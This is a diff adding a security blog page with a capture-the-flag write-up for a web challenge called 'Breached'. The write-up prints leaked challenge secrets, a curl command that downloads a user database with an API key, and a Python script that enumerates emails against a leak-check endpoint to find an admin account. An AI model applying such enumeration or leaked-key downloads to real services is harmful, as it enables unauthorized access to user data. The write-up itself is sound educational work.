@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Breached<br> | Parthiv Kumar Nikku</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/x-icon" href="../../assets/logos/favicon.ico">
+
+  <!-- Blog CSS -->
+  <link rel="stylesheet" href="../css/blog.css">
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav class="blog-navbar">
+    <div class="nav-left">
+      <a href="../index.html" class="nav-link">
+        <i class="fas fa-blog"></i> Blog
+      </a>
+    </div>
+
+    <div class="nav-links">
+      <a href="../../index.html" class="nav-link">
+        <i class="fas fa-arrow-left"></i> Portfolio
+      </a>
+    </div>
+
+    <!-- Theme Toggle - Single Icon -->
+    <div class="theme-toggle" id="theme-toggle" title="Toggle theme">
+      <span class="icon sun"><i class="fas fa-sun"></i></span>
+      <span class="icon moon"><i class="fas fa-moon"></i></span>
+    </div>
+
+    <!-- Mobile Menu Button - Hamburger Style -->
+    <button class="mobile-menu-btn" id="mobile-menu-btn" aria-label="Toggle menu">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </nav>
+
+  <!-- MAIN LAYOUT -->
+  <main class="blog-layout">
+    
+    <!-- SIDEBAR -->
+    <aside class="blog-sidebar" id="blog-sidebar">
+      <h3><i class="fas fa-list"></i> Blog Posts</h3>
+      <ul>
+        <li><a href="IITB25-Breached-Writeup.html"><i class="fas fa-file-alt"></i> Breached<br></a></li><li><a href="THM-Valenfind.html"><i class="fas fa-file-alt"></i> THM - Valenfind Write-up</a></li><li><a href="template.html"><i class="fas fa-file-alt"></i> Your Awesome Write-up Title"<br></a></li>
+      </ul>
+      
+      <h3 style="margin-top: 2rem;"><i class="fas fa-link"></i> Quick Links</h3>
+      <ul>
+        <li>
+          <a href="../../index.html">
+            <i class="fas fa-home"></i> Main Portfolio
+          </a>
+        </li>
+        <li>
+          <a href="../../html/certifications.html">
+            <i class="fas fa-certificate"></i> Certifications
+          </a>
+        </li>
+        <li>
+          <a href="../../html/projects.html">
+            <i class="fas fa-project-diagram"></i> Projects
+          </a>
+        </li>
+      </ul>
+    </aside>
+    
+    <!-- Sidebar Overlay (Mobile) -->
+    <div class="sidebar-overlay" id="sidebar-overlay"></div>
+    
+    <!-- Sidebar Toggle Button (Mobile) -->
+    <button class="sidebar-toggle" id="sidebar-toggle" aria-label="Toggle sidebar">
+      <i class="fas fa-bars"></i>
+    </button>
+    
+    <!-- CONTENT AREA -->
+    <article class="blog-content">
+      <header class="post-header">
+        <h1 class="post-title">Breached<br></h1>
+        
+
+        <div class="meta-row">
+          <span class="meta-item"><i class="fas fa-calendar-alt"></i> 2025-11-29<br></span>
+          <span class="meta-item"><i class="fas fa-clock"></i> 8 min read</span>
+          <span class="meta-item"><i class="fas fa-user"></i> scap3sh4rk<br></span>
+          
+          
+          <span class="meta-item tags"><span class="tag tag-[web">[web</span><span class="tag tag-endpoint-detection">endpoint-detection</span><span class="tag tag-medium]<br>">medium]<br></span></span>
+          
+        </div>
+      </header>
+
+      <div class="post-body"><blockquote>
+<p>Challange Description:
+The admin email of Acme Surveys was leaked, but the identity of the admin is unknown. The objective was to identify the admin email using the provided leak-checking service and derive the flag through a cryptographic HMAC comparison implemented in the backend. The challenge highlights how auxiliary endpoints can undermine otherwise secure cryptographic constructions.</p>
+</blockquote>
+<hr />
+<h2>Challenge Metadata</h2>
+<ul>
+<li><strong>Room Name:</strong> breached</li>
+<li><strong>Platform:</strong> IIT Bombay CTF 2025</li>
+<li><strong>URL:</strong> <a href="https://asdasdasd">link</a></li>
+<li><strong>Difficulty:</strong> Medium</li>
+<li><strong>Category:</strong> Web</li>
+<li><strong>Points:</strong> 500</li>
+</ul>
+<hr />
+<h2>Introduction</h2>
+<p>This challenge revolves around identifying a hidden administrative identity and leveraging a cryptographic mechanism to derive the flag. The backend relies on HMAC-SHA256 to determine administrative privileges. An auxiliary API unintentionally leaks identifying metadata, enabling enumeration of the admin account.</p>
+<h2>1. Reconnaissance</h2>
+<p>Artifacts provided:</p>
+<ul>
+<li>Flask web application</li>
+<li>Docker environment</li>
+<li><code>.env</code> file</li>
+</ul>
+<pre><code>FLAG_SECRET = 3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F
+ADMIN_API_KEY = 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0
+</code></pre>
+<p>Core validation condition:</p>
+<pre><code>HMAC_SHA256(FLAG_SECRET, email) == FLAG_TOKEN
+</code></pre>
+<h3>Passive Reconnaissance</h3>
+<ul>
+<li>Reviewed Flask routes</li>
+<li>Inspected environment variables</li>
+<li>Analyzed token generation logic</li>
+</ul>
+<h3>Active Reconnaissance</h3>
+<p>Leak-check endpoint:</p>
+<pre><code>https://tlctf2025-hibc.chals.io/check_email?email=&lt;email&gt;
+</code></pre>
+<figure class="post-figure" id="fig-1-1">
+  <img width="1214" height="274" alt="image" src="https://github.com/user-attachments/assets/9c199a67-3779-4692-8cd2-2b07a0a59c01" />
+  <figcaption>Fig1.1 - image</figcaption>
+</figure>
+
+<p>Database download:</p>
+<pre><code class="language-bash">curl -s -H &quot;X-API-Key: 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0&quot; https://tlctf2025-data-app.chals.io/download_db -o runtime_db.csv
+</code></pre>
+<hr />
+<h2>2. Scanning and Enumeration</h2>
+<p>Typical response from <code>/check_email</code>:</p>
+<pre><code class="language-json">{
+  &quot;email&quot;: &quot;test@acme.test&quot;,
+  &quot;plaintext_password&quot;: null,
+  &quot;pwned&quot;: false
+}
+</code></pre>
+<p>Hypothesis:</p>
+<p>The admin email would produce an anomalous response.</p>
+<hr />
+<h2>3. Gaining Access (Exploitation)</h2>
+<h3>Vulnerability Analysis</h3>
+<ul>
+<li>HMAC logic was secure.</li>
+<li>Admin identity derived via HMAC comparison.</li>
+<li>Auxiliary endpoint leaked <code>pwned</code> metadata.</li>
+<li>Only one email returned <code>pwned: true</code>.</li>
+</ul>
+<h3>Exploitation Steps</h3>
+<pre><code class="language-python">import csv, requests
+
+URL = &quot;https://tlctf2025-hibc.chals.io/check_email&quot;
+
+with open(&quot;runtime_db.csv&quot;) as f:
+    r = csv.DictReader(f)
+    for row in r:
+        email = row[&quot;email&quot;]
+        resp = requests.get(URL, params={&quot;email&quot;: email})
+        data = resp.json()
+
+        if data.get(&quot;pwned&quot;) or data.get(&quot;plaintext_password&quot;) or data != {
+            &quot;email&quot;: email,
+            &quot;plaintext_password&quot;: None,
+            &quot;pwned&quot;: False
+        }:
+            print(&quot;ADMIN FOUND:&quot;, email)
+            print(data)
+            break
+</code></pre>
+<p>Result:</p>
+<pre><code>ADMIN FOUND: blake.baker20@acme.test
+{&quot;email&quot;: &quot;blake.baker20@acme.test&quot;, &quot;plaintext_password&quot;: null, &quot;pwned&quot;: true}
+</code></pre>
+<figure class="post-figure" id="fig-1-2">
+  <img width="1214" height="274" alt="image" src="https://github.com/user-attachments/assets/f5bc8cf6-e182-4f24-8131-5324eeaf99cd" />
+  <figcaption>Fig1.2 - image</figcaption>
+</figure>
+
+<hr />
+<h2>4. Privilege Escalation</h2>
+<p>Not applicable. Identification of the correct email was sufficient.</p>
+<hr />
+<h2>5. Post-Exploitation &amp; Loot</h2>
+<pre><code class="language-python">import hmac, hashlib
+
+SECRET = &quot;3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F&quot;
+email  = &quot;blake.baker20@acme.test&quot;
+
+token  = hmac.new(SECRET.encode(), email.encode(), hashlib.sha256).hexdigest()
+
+print(&quot;FLAG: trustctf{&quot; + token[:12] + &quot;}&quot;)
+</code></pre>
+<hr />
+<h2>Conclusion</h2>
+<p>The weakness was not in cryptography but in metadata exposure through an auxiliary endpoint. Security failures often emerge from integration boundaries rather than core primitives.</p>
+<blockquote>
+<p>"Security fails at the boundaries, not the primitives." — scap3sh4rk</p>
+</blockquote>
+<hr />
+<p><em>writeup by @scap3sh4rk</em></p></div>
+    </article>
+    
+  </main>
+
+  <!-- FOOTER -->
+  <footer style="text-align: center; padding: 1.5rem; border-top: 1px solid var(--border-color); background: var(--bg-secondary);">
+    <p>&copy; 2026 Parthiv Kumar Nikku | Security Blog</p>
+    <p style="font-size: 0.9rem; color: var(--text-muted); margin-top: 0.5rem;">
+      <i class="fas fa-lock"></i> Secured with &lt;/&gt; and coffee
+    </p>
+  </footer>
+
+  <!-- JavaScript -->
+  <script src="../js/blog.js"></script>
+</body>
+</html>
